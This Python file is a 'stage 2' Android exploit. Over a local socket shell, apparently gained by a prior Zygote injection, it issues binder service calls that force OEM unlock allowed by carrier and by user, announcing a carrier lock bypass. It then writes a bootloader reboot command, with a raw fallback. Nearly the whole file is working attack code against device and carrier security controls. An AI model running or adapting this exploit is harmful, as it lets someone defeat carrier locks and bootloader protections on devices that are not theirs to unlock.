import socket
import codecs
import re
import shlex
from typing import Any
from io import BytesIO
from pathlib import Path

import aidl

from .exceptions import *
from .parcel import *


def swap_endianness(bytes_: bytes) -> bytes:
    result = b""
    bytes_io = BytesIO(bytes_)
    while True:
        read_bytes = bytes_io.read(4)
        if not read_bytes:
            break
        result += read_bytes[::-1]
    return result


def parse_service_result(service_result: str) -> tuple[bytes, str]:
    """
    サービスコールの結果をパースし、(生データ, エラーメッセージ) を返す。
    """
    # エラーがあるか確認
    if "Exception" in service_result or "SecurityException" in service_result:
        # エラーメッセージを抽出
        error_lines = [line for line in service_result.split("\n") if "Exception" in line or "error" in line.lower()]
        return b"", "\n".join(error_lines) if error_lines else service_result

    EXPRESSION = re.compile(
        r"^(?:Result\: Parcel\(|  0x[0-9a-fA-F]+: )((?:[0-9a-fA-F ])+)'[^']*'\)?$"
    )
    matched_any = False
    result = b""
    for line in service_result.split("\n"):
        matched = EXPRESSION.fullmatch(line)
        if matched is None:
            continue
        matched_any = True
        result += codecs.decode(matched[1].replace(" ", ""), "hex")
    if not matched_any:
        return b"", service_result
    return swap_endianness(result), ""


def parse_boolean_result(result: bytes) -> bool:
    if len(result) < 8:
        return False
    status = int.from_bytes(result[:4], "little")
    if status:
        raise Exception("Service returned error status")
    return bool(int.from_bytes(result[4:8], "little"))


# Load AIDL definitions
with open(Path(__file__).parent / "IOemLockService.aidl") as f:
    oem_lock_aidl = f.read()
oem_lock_service = parse_aidl_interface(aidl.fromstring(oem_lock_aidl), "IOemLockService")

with open(Path(__file__).parent / "IPowerManager.aidl") as f:
    power_aidl = f.read()
power_service = parse_aidl_interface(aidl.fromstring(power_aidl), "IPowerManager")

known_services = {
    "oem_lock": oem_lock_service,
    "power": power_service,
}


class Stage2Exploit:
    def __init__(self, port: int = 1234):
        self.port = port

    def call_service(self, sock, service_name, function, *args):
        interface = known_services[service_name]
        func = interface[function]
        parsed = func.parse_arguments(args)
        cmd = ["service", "call", service_name, str(func.code), *parsed]
        full_cmd = shlex.join(cmd)
        print(f"[CMD] {full_cmd}")
        sock.sendall(full_cmd.encode() + b"\n")
        resp = sock.recv(10000).decode()
        print(f"[RESPONSE]\n{resp}")

        raw, error = parse_service_result(resp)
        if error:
            print(f"[ERROR] {error}")
            raise ZygoteInjectionException(f"service call failed: {error}")

        if not raw:
            # Void method, no return data
            return None

        ret = func.parse_return(raw)
        status = ret[0]
        if status:
            raise ZygoteInjectionException(f"Service returned error code {status}")
        return ret[1] if len(ret) > 1 else None

    def exploit_stage2(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect(("127.0.0.1", self.port))
            sock.sendall(b"\n")  # flush

            # --- OEM unlock (既存コード) ---
            print("=== OEM Unlock ===")
            try:
                carrier = self.call_service(sock, "oem_lock", "isOemUnlockAllowedByCarrier")
                user = self.call_service(sock, "oem_lock", "isOemUnlockAllowedByUser")
                allowed = self.call_service(sock, "oem_lock", "isOemUnlockAllowed")
                if not carrier:
                    print("Carrier lock present, attempting to remove...")
                    self.call_service(sock, "oem_lock", "setOemUnlockAllowedByCarrier", 1)
                    if self.call_service(sock, "oem_lock", "isOemUnlockAllowedByCarrier"):
                        print("*** CARRIER OEM UNLOCK BYPASSED ***")
                if not user:
                    self.call_service(sock, "oem_lock", "setOemUnlockAllowedByUser", 1)
                    if not self.call_service(sock, "oem_lock", "isOemUnlockAllowedByUser"):
                        print("Enable OEM unlock in developer options.")
                if not allowed and self.call_service(sock, "oem_lock", "isOemUnlockAllowed"):
                    print("OEM unlock is now allowed!")
                if self.call_service(sock, "oem_lock", "isDeviceOemUnlocked"):
                    print("Bootloader already unlocked.")
            except Exception as e:
                print(f"OEM unlock error: {e}")

            # --- BCB write: reboot to bootloader ---
            print("\n=== Writing BCB (bootonce-bootloader) ===")
            try:
                # IPowerManager.reboot(confirm=False, reason="bootloader", wait=False)
                result = self.call_service(
                    sock,
                    "power",
                    "reboot",
                    False,          # confirm
                    "bootloader",   # reason
                    False           # wait
                )
                if result is None:
                    print("SUCCESS: BCB write command accepted.")
                    print("The device should reboot to bootloader (fastboot) mode on next restart.")
                    print("Please manually reboot the device now using: reboot")
                else:
                    print(f"Unexpected return value: {result}")
            except Exception as e:
                print(f"BCB write via service call failed: {e}")
                print("Trying fallback: raw service call command...")
                try:
                    sock.sendall(b"service call power 18 i32 0 s16 \"bootloader\" i32 0\n")
                    resp = sock.recv(10000).decode()
                    print(f"[FALLBACK RESPONSE]\n{resp}")
                    if "Parcel(" in resp and "Exception" not in resp:
                        print("Fallback command likely succeeded. BCB should be written.")
                    else:
                        print("Fallback command may have failed.")
                except Exception as e2:
                    print(f"Fallback failed: {e2}")

            print("\n=== Done ===")


if __name__ == "__main__":
    Stage2Exploit().exploit_stage2()
